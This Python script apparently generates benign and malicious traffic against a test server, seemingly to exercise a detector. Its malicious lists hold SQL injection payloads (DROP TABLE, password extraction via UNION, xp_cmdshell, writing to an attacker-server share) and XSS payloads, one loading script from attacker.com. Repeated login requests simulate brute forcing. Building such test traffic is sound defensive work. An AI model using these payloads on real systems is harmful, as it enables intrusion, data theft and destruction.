import requests

# Define your custom User-Agent string
user_agent = "Safari/1.0"

# Create headers with the User-Agent
headers = {"User-Agent": user_agent}

base_url = "http://8080-busaosowor-vulnserevr-9vv5rat0e0l.ws-eu104.gitpod.io/"


benign_payloads = [
    "SELECT * FROM users WHERE username = 'john'",
    "SELECT id, name FROM products WHERE category = 'electronics'",
    "SELECT COUNT(*) FROM orders WHERE status = 'complete'",
]

malicious_payloads = [
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "UNION SELECT null, username, password FROM users --",
    "' OR IF(1=1, SLEEP(5), 0) --",
    '" OR ""="',
    "1; DROP TABLE users--",
    "'SELECT * FROM users; DROP TABLE products;",
    '" UNION SELECT null, table_name, column_name FROM information_schema.columns --',
    "1 AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects)) --",
    "'; EXEC xp_cmdshell('dir') --",
    '1; EXEC sp_configure "show advanced options", 1; RECONFIGURE; --',
    "1; EXEC sp_makewebtask '\\attacker-server\\payload.htm', 'SELECT * FROM users', '--",
    "'; EXEC sp_send_dbmail 'admin@example.com', 'Test Subject', 'Test Body' --",
]

for load in benign_payloads:
    url = f"{base_url}{load}"
    response = requests.get(url, headers)
    print(url)


for load in malicious_payloads:
    url = f"{base_url}{load}"
    response = requests.get(url, headers)
    print(url)


benign_payloads = [
    "<p>Hello, world!</p>",
    '<input type="text" value="John Doe">',
    '<a href="/home">Home</a>',
    '<div class="content">This is safe.</div>',
]

malicious_payloads = [
    "<script>alert('XSS');</script>",
    '<img src="x" onerror="alert(\'XSS\')">',
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "<svg/onload=alert(1)>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    '<img src="x" onload="evilFunction()">',
    '<script src="http://attacker.com/malicious.js"></script>',
    "<a href=\"data:text/html,<script>alert('XSS')</script>\">Click here</a>",
    '<img src="x" onmouseover="alert(\'XSS\')">',
    "<video><source onerror=\"javascript:alert('XSS')\"></video>",
]


for load in benign_payloads:
    url = f"{base_url}{load}"
    response = requests.get(url, headers)
    print(url)


for load in malicious_payloads:
    url = f"{base_url}{load}"
    response = requests.get(url, headers)
    print(url)


for _ in range(10):
    load = "username=johndoe&password=123abc###"
    url = f"{base_url}{load}"
    response = requests.get(url, headers)
    print(url)


for _ in range(10):
    load = "username=admin&password=123abc###"
    url = f"{base_url}{load}"
    response = requests.get(url, headers)
    print(url)


for _ in range(102):
    load = "admin"
    url = f"{base_url}{load}"
    response = requests.get(url, headers)
    print(url)
